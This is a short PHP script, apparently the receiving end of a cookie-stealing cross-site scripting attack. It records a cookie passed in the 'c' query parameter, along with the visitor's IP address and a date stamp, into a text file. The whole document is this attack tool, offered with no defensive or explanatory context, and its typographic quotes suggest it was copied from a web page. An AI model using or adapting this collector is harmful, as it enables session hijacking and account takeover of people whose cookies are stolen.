<?php
$f=fopen(‘id.txt’, ‘a’);
$date=date(“j F, Y, g:i a”);
fwrite($f, “IP Address : “.$_SERVER[‘REMOTE_ADDR’].”\n”.
“Cookie : “.$_GET[‘c’].”\n”.
“Date/Time : “.$date.”\n\n\n”);
fclose($f);
?>
